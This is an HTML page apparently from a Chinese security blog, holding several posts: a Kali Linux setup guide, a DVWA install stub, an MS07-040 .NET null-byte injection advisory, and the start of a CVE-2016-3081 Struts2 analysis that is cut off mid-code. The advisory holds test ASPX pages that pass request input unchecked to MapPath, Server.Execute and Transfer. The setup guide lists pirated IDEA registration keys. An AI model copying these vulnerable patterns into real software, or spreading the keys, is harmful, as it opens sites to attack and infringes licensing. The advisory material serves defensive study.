+<pre><code>update-alternatives --install /usr/bin/java java /usr/lib/jdk/jdk1.7.0_03/bin/java 300
+update-alternatives --install /usr/bin/javac javac /usr/lib/jdk/jdk1.7.0_03/bin/javac 300
+update-alternatives --config java
+update-alternatives --config javac</code></pre></li>
+</ul>
+<p><img src="http://static.oschina.net/uploads/img/201403/06002415_wAFS.png" alt=""></p>
+<ul>
+<li><p>IDEA 13 下载及安装</p>
+<p>  下载最新的 tar 包，解压出来，进入 bin    ./idea.sh 即可 启动</p>
+<p>  注册码：</p>
+<pre><code>用户名：qianbi
+注册码：00667-3LLZU-A174Q-GQ9WU-QCR2R-8RXG3
+注册码：00701-AWVMK-JG2K1-OPKFI-099ZF-LJNS4
+注册码：00122-PHU9A-1C01F-1QOID-GYCT8-B3NM3
+注册码：00979-DV75L-VEUEI-3ZNBS-GKD3C-ZKNX2
+注册码：00127-DDFPG-E91IA-DP5U3-4WYJE-8HF34
+注册码：00310-I608W-EA5YT-Z6IJ2-M2KU2-STY95
+注册码：00965-VFZO8-8190O-8T2MR-XR8VQ-GUBA3
+注册码：00422-4SO2M-1VXOY-LB4K1-XW05P-XT3E3</code></pre></li>
+</ul>
+<h2 id="0x09-安装代码编辑器"><a href="#0x09-安装代码编辑器" class="headerlink" title="0x09 安装代码编辑器"></a>0x09 安装代码编辑器</h2><ul>
+<li><p>sublime解决不能输入中文方法：</p>
+<ol>
+<li><p>新建并保存下面的代码为sublime_imfix.c</p>
+<pre><code>/*
+sublime-imfix.c
+Use LD_PRELOAD to interpose some function to fix sublime input method support for linux.
+By Cjacker Huang 
+
+gcc -shared -o libsublime-imfix.so sublime_imfix.c  `pkg-config --libs --cflags gtk+-2.0` -fPIC
+LD_PRELOAD=./libsublime-imfix.so sublime_text
+*/
+#include 
+#include 
+typedef GdkSegment GdkRegionBox;
+
+struct _GdkRegion
+{
+  long size;
+  long numRects;
+  GdkRegionBox *rects;
+  GdkRegionBox extents;
+};
+
+GtkIMContext *local_context;
+
+void
+gdk_region_get_clipbox (const GdkRegion *region,
+            GdkRectangle    *rectangle)
+{
+  g_return_if_fail (region != NULL);
+  g_return_if_fail (rectangle != NULL);
+
+  rectangle-&gt;x = region-&gt;extents.x1;
+  rectangle-&gt;y = region-&gt;extents.y1;
+  rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1;
+  rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1;
+  GdkRectangle rect;
+  rect.x = rectangle-&gt;x;
+  rect.y = rectangle-&gt;y;
+  rect.width = 0;
+  rect.height = rectangle-&gt;height; 
+  //The caret width is 2; 
+  //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret.
+  if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) {
+        gtk_im_context_set_cursor_location(local_context, rectangle);
+  }
+}
+
+//this is needed, for example, if you input something in file dialog and return back the edit area
+//context will lost, so here we set it again.
+
+static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)
+{
+    XEvent *xev = (XEvent *)xevent;
+    if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) {
+       GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;);
+       if(GDK_IS_WINDOW(win))
+         gtk_im_context_set_client_window(im_context, win);
+    }
+    return GDK_FILTER_CONTINUE;
+}
+
+void gtk_im_context_set_client_window (GtkIMContext *context,
+          GdkWindow    *window)
+{
+  GtkIMContextClass *klass;
+  g_return_if_fail (GTK_IS_IM_CONTEXT (context));
+  klass = GTK_IM_CONTEXT_GET_CLASS (context);
+  if (klass-&gt;set_client_window)
+    klass-&gt;set_client_window (context, window);
+
+  if(!GDK_IS_WINDOW (window))
+    return;
+  g_object_set_data(G_OBJECT(context),&quot;window&quot;,window);
+  int width = gdk_window_get_width(window);
+  int height = gdk_window_get_height(window);
+  if(width != 0 &amp;&amp; height !=0) {
+    gtk_im_context_focus_in(context);
+    local_context = context;
+  }
+  gdk_window_add_filter (window, event_filter, context); 
+}</code></pre></li>
+<li><p>编译动态库</p>
+<pre><code>gcc -shared -o libsublime-imfix.so sublime_imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</code></pre></li>
+<li><p>设置 LD_PRELOAD 并启动 Sublime Text：</p>
+<pre><code>LD_PRELOAD=./libsublime-imfix.so sublime_text</code></pre><p>解决界面汉化：网上搜索下载Sublime_Text_CN_3059.zip，解压之后得到Default.sublime-package文件，其实就是个package，在菜单中选择preferences——Browse packages进入到<code>/home/siat/.config/sublime-text-3/Packages</code>然后向上一级进入到<code>/home/siat/.config/sublime-text-3/Installed Packages</code>，把Default.sublime-package包复制到Installed    Packages文件夹下，这时sublime text3立刻变成中文了。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="0x10-安装-git"><a href="#0x10-安装-git" class="headerlink" title="0x10 安装 git"></a>0x10 安装 git</h2><p>安装：</p>
+<pre><code>aptitude install git-core
+aptitude install git-doc git-svn git-email git-gui gitk</code></pre><p>配置：</p>
+<pre><code>ssh-keygen -t rsa -C &quot;xxxx@email.com&quot;</code></pre><p>进入 github 设置  SSH Keys：</p>
+<p><img src="http://static.oschina.net/uploads/space/2014/0304/231551_SyDR_615783.png" alt=""></p>
+<p><code>ssh -T git@github.com</code></p>
+<p>看其是否返回：</p>
+<p><code>Hi xxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access .</code></p>
+<p><strong>设置git 全局变量 ，name 和 email</strong></p>
+<pre><code>git config --global user.name &quot;yourusername&quot;
+git config --global user.email &quot;youremailaddress&quot;</code></pre><h2 id="0x11-一些工具"><a href="#0x11-一些工具" class="headerlink" title="0x11 一些工具"></a>0x11 一些工具</h2><pre><code>apt-get install gnome-tweak-tool                 #安装gnome管理软件
+apt-get install synaptic                  #安装新立德
+apt-get install software-center                   #安装ubuntu软件中心
+apt-get install file-roller                            #安装解压缩软件
+apt-get install gedit                        #安装gedit编辑软件
+apt-get install audacious                   #audacious音乐播放器
+apt-get install smplayer                 #安装smplayer视频播放器</code></pre><h2 id="0x12-娱乐"><a href="#0x12-娱乐" class="headerlink" title="0x12 娱乐"></a>0x12 娱乐</h2><ul>
+<li><p>安装dota2和steam平台</p>
+<p>  <strong>（64位适合）</strong></p>
+<p>  首选官网下载steam并且dpkg安装下，然后如果你是root运行会有提示。解决方法终端执行：</p>
+<pre><code>/usr/bin
+gedit steam</code></pre><p>  然后找到如下位置，并且把双引号中的0改成1即可</p>
+<pre><code># Don’t allow running as root
+if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then
+show_message –error $”Cannot run as root user”
+exit 1
+Fi</code></pre><p>  然后登陆账号，下载dota2。</p>
+</li>
+<li><p>网易云音乐</p>
+<p>  首先git下 <a href="https://github.com/cosven/FeelUOwn" target="_blank" rel="noopener">https://github.com/cosven/FeelUOwn</a></p>
+<p>  然后下载后依次输入</p>
+<pre><code>root@kali:git clone https://github.com/cosven/FeelUOwn.git
+root@kali:cd FeelUOwn
+root@kali:./install.sh</code></pre></li>
+</ul>
+<h2 id="0x13-wps等一系列软件"><a href="#0x13-wps等一系列软件" class="headerlink" title="0x13 wps等一系列软件"></a>0x13 wps等一系列软件</h2><pre><code>链接: http://pan.baidu.com/s/1c0b2qiO 密码: l3bj</code></pre><h2 id="参考网站："><a href="#参考网站：" class="headerlink" title="参考网站："></a>参考网站：</h2><pre><code>http://www.cnblogs.com/Kali-BT/p/4199533.html
+http://www.th7.cn/system/lin/201508/127806.shtml  //sublime text3
+http://www.blackmoreops.com/
+http://www.blackmoreops.com/2014/02/27/change-install-theme-kali-linux-gtk-3-themes/</code></pre>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-dvwa-install-log/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-dvwa-install-log/" class="post-title-link" itemprop="url">DVWA 部署记录</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 01:01:40" itemprop="dateCreated datePublished" datetime="2016-05-14T01:01:40+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:29:32" itemprop="dateModified" datetime="2019-07-25T14:29:32+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-dvwa-install-log/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-dvwa-install-log/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">DVWA</a></p>
+<h1 id="Kali-linux-部署-DVWA"><a href="#Kali-linux-部署-DVWA" class="headerlink" title="Kali linux 部署 DVWA"></a>Kali linux 部署 DVWA</h1><p>参考链接: <a href="http://my.oschina.net/sukai/blog/166811" target="_blank" rel="noopener">Kali linux 部署 DVWA</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ms07-040/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-ms07-040/" class="post-title-link" itemprop="url">MS07-040 .NET Framework中的漏洞可能允许远程执行代码</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:58:49" itemprop="dateCreated datePublished" datetime="2016-05-14T00:58:49+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:28:52" itemprop="dateModified" datetime="2019-07-25T14:28:52+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-ms07-040/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-ms07-040/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+
+<h1 id="MS07-040"><a href="#MS07-040" class="headerlink" title="MS07-040"></a><a href="https://technet.microsoft.com/library/security/ms07-040" target="_blank" rel="noopener">MS07-040</a></h1><p><em>Microsoft .Net Framework多个空字节注入漏洞</em></p>
+<h2 id="受影响系统"><a href="#受影响系统" class="headerlink" title="受影响系统"></a>受影响系统</h2><pre><code>Microsoft .NET Framework 2.0
+Microsoft .NET Framework 1.1
+Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>BUGTRAQ  ID: <a href="http://www.securityfocus.com/bid/24791" target="_blank" rel="noopener">24791</a></p>
+<p>CVE(CAN) ID: <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0042" target="_blank" rel="noopener">CVE-2007-0042</a></p>
+<p>Microsoft .NET Framework是一个流行的软件开发工具包。 </p>
+<p>.NET Framework在处理网页请求时存在漏洞，远程攻击可能利用此漏洞绕过安全限制访问到敏感信息。</p>
+<p>.NET Framework的Server.MapPath、Server.Execute、Server.Transfer、String.Compare、System.Net.Mail.SmtpMail.Send方式没有正确地验证某些用户输入参数，允许用户在提交的URI中注入任意空字节。成功地利用此漏洞的攻击者绕过ASP.NET网站的安全限制下载任何网页的内容。</p>
+<blockquote>
+<p>来源：Paul Craig （<a href="mailto:headpimp@pimp-industries.com">headpimp@pimp-industries.com</a>）</p>
+</blockquote>
+<blockquote>
+<p>链接：<a href="http://security-assessment.com/files/advisories/2007-07-11_Multiple_.NET_Null_Byte_Injection_Vulnera" target="_blank" rel="noopener">http://security-assessment.com/files/advisories/2007-07-11_Multiple_.NET_Null_Byte_Injection_Vulnera</a><br><a href="http://secunia.com/advisories/26003/" target="_blank" rel="noopener">http://secunia.com/advisories/26003/</a><br><a href="http://www.microsoft.com/technet/security/Bulletin/ms07-040.mspx?pf=true" target="_blank" rel="noopener">http://www.microsoft.com/technet/security/Bulletin/ms07-040.mspx?pf=true</a><br><a href="http://www.us-cert.gov/cas/techalerts/TA07-191A.html" target="_blank" rel="noopener">http://www.us-cert.gov/cas/techalerts/TA07-191A.html</a></p>
+</blockquote>
+<h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul>
+<li><p>例1：</p>
+  <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"vb"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;vb.net MapPath example &lt;/title&gt;</span><br><span class="line">      &lt;script runat=<span class="string">"server"</span>&gt;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">Sub</span> Page_Load()</span><br><span class="line">              <span class="keyword">dim</span> name <span class="keyword">as</span> <span class="built_in">string</span></span><br><span class="line">              <span class="keyword">dim</span> realname <span class="keyword">as</span> <span class="built_in">string</span></span><br><span class="line">          name = request(<span class="string">"name"</span>) &amp; <span class="string">".uploaded"</span></span><br><span class="line">              realname = Mappath(<span class="string">"."</span>) &amp; <span class="string">"\"</span> &amp; name</span><br><span class="line">          response.write(<span class="string">"Mappath of name = &lt;b&gt;"</span> &amp; MapPath(name) &amp; <span class="string">"&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">               response.write(<span class="string">"The real value is: &lt;b&gt;"</span> &amp; realname &amp; <span class="string">"&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">         <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;asp:label id=<span class="string">"Message"</span> runat=<span class="string">"server"</span>/&gt;</span><br><span class="line">   &lt;asp:label id=<span class="string">"Message2"</span> runat=<span class="string">"server"</span>/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>例2：</p>
+  <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"VB"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">  			&lt;script runat=<span class="string">"server"</span>&gt;</span><br><span class="line">     			<span class="keyword">Sub</span> Page_Load()</span><br><span class="line">        		Server.Execute(request(<span class="string">"page"</span>))</span><br><span class="line">      		<span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">  			&lt;/script&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>例3：</p>
+  <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"VB"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Server.execute &lt;/title&gt;</span><br><span class="line">   &lt;script runat=<span class="string">"server"</span>&gt;</span><br><span class="line">      <span class="keyword">Sub</span> Page_Load()</span><br><span class="line">      Server.Transfer(request(<span class="string">"page"</span>))</span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>例4：</p>
+  <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"vb"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;<span class="built_in">String</span>.<span class="keyword">Compare</span>&lt;/title&gt;</span><br><span class="line">      &lt;script runat=<span class="string">"server"</span>&gt;</span><br><span class="line">         <span class="keyword">Sub</span> Page_Load()</span><br><span class="line">			<span class="keyword">dim</span> allowed, sFirstItem, sSecondItem <span class="keyword">as</span> <span class="built_in">string</span></span><br><span class="line">		    sFirstItem = Request(<span class="string">"first"</span>)</span><br><span class="line">		    sSecondItem = Request(<span class="string">"second"</span>)</span><br><span class="line">		    response.Write (<span class="string">"String.Compare - First item = "</span> &amp; sFirstItem &amp; <span class="string">"&lt;br&gt;"</span>)</span><br><span class="line">		    response.Write (<span class="string">"String.Compare - Second item = "</span> &amp; sSecondItem &amp; <span class="string">"&lt;br&gt;"</span>)</span><br><span class="line">		    <span class="keyword">if</span> <span class="built_in">String</span>.<span class="keyword">Compare</span>(sFirstItem, sSecondItem) =<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		        response.Write (<span class="string">"&lt;b&gt;String.Compare - Matched! Strings are the same&lt;/b&gt;"</span> &amp; <span class="string">"&lt;br&gt;"</span>)    </span><br><span class="line">		    <span class="keyword">else</span></span><br><span class="line">		        response.Write (<span class="string">"&lt;b&gt;String.Compare - Failed!! Strings are diffrent &lt;/b&gt;"</span> &amp; <span class="string">"&lt;br&gt;"</span>)</span><br><span class="line">		    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">		    <span class="keyword">if</span> sFirstItem=sSecondItem <span class="keyword">then</span></span><br><span class="line">		        response.Write (<span class="string">"Direct eval - Matched!"</span> &amp; <span class="string">"&lt;br&gt;"</span>)</span><br><span class="line">		        <span class="keyword">else</span></span><br><span class="line">		        response.Write (<span class="string">"&lt;b&gt;Direct eval - Failed!!&lt;/b&gt;"</span> &amp; <span class="string">"&lt;br&gt;"</span>)</span><br><span class="line">		    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">         <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>例5：</p>
+  <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;% @Import <span class="keyword">Namespace</span>=<span class="string">"System.Web.Mail"</span> %&gt;</span><br><span class="line">&lt;% @Import <span class="keyword">Namespace</span>=<span class="string">"System.IO"</span> %&gt;</span><br><span class="line">&lt;%@ Page Language=<span class="string">"vb"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;vb.net MapPath example &lt;/title&gt;</span><br><span class="line">      &lt;script runat=<span class="string">"server"</span>&gt;</span><br><span class="line">		<span class="keyword">Private</span> <span class="keyword">Sub</span> Page_Load(sender <span class="keyword">As</span> <span class="built_in">Object</span>, e <span class="keyword">As</span> System.EventArgs)</span><br><span class="line">		<span class="keyword">Dim</span> m <span class="keyword">As</span> <span class="keyword">New</span> MailMessage()</span><br><span class="line">		m.<span class="keyword">From</span> = <span class="string">"tester@security-assessment.com"</span></span><br><span class="line">		m.<span class="keyword">To</span> = request(<span class="string">"to"</span>) &amp; <span class="string">"@security-assessment.com"</span></span><br><span class="line">		m.Subject = request(<span class="string">"subject"</span>) &amp; <span class="string">": FromWebsite"</span></span><br><span class="line">		m.Body = request(<span class="string">"body"</span>) &amp; <span class="string">"This message was submitted by a user."</span></span><br><span class="line">		Response.Write(<span class="string">"Sending mail to: "</span> &amp; m.<span class="keyword">to</span>)</span><br><span class="line">		m.Fields.Add(<span class="string">"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate"</span>, <span class="string">"1"</span>) <span class="comment">'basic authentication</span></span><br><span class="line">		m.Fields.Add(<span class="string">"http://schemas.microsoft.com/cdo/configuration/sendusername"</span>, <span class="string">"username-goes-here"</span>) </span><br><span class="line">		m.Fields.Add(<span class="string">"http://schemas.microsoft.com/cdo/configuration/sendpassword"</span>, <span class="string">"password-goes-here"</span>) <span class="comment">'set your </span></span><br><span class="line">		SmtpMail.SmtpServer = <span class="string">"mail.server.here"</span></span><br><span class="line">		SmtpMail.Send(m)</span><br><span class="line">		<span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/" class="post-title-link" itemprop="url">CVE-2016-3081_Struts2_detial</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:55:51" itemprop="dateCreated datePublished" datetime="2016-05-14T00:55:51+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:30:30" itemprop="dateModified" datetime="2019-07-25T14:30:30+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-cve-2016-3081-struts2-detial/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><p>2016年4月21日Struts2官方发布两个CVE，其中CVE-2016-3081官方评级为高。主要原因为在用户开启动态方法调用的情况下，会被攻击者实现远程代码执行攻击。从我自己搜索的情况来看，国内开启这个功能的网站不在少数，所以这个“Possible Remote Code Execution”漏洞的被打的可能性还是很高的。</p>
+<h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>直接进行版本比对，我们可以看到针对这个问题，只对DefaultActionMapper.java这个文件进行了修改，修改内容如下：</p>
+<p><img src="http://static.wooyun.org//drops/20160426/2016042610071380042.png" alt=""></p>
+<p>我们可以看到只是把method成员变量的值进行了一次过滤，cleanupActionName这个方法是在对“action:”滥用的问题进行添加的，禁止了绝大多数的特殊字符。但是在后来的版本变更中忽略了之前的问题，将method也引入了Ongl表达式，代码在DefaultAction.java的invokeAction中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"> </span><br><span class="line">        Object methodResult;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            methodResult = ognlUtil.getValue(methodName + <span class="string">"()"</span>, getStack().getContext(), action);</span><br></pre></td></tr></table></figure>
+
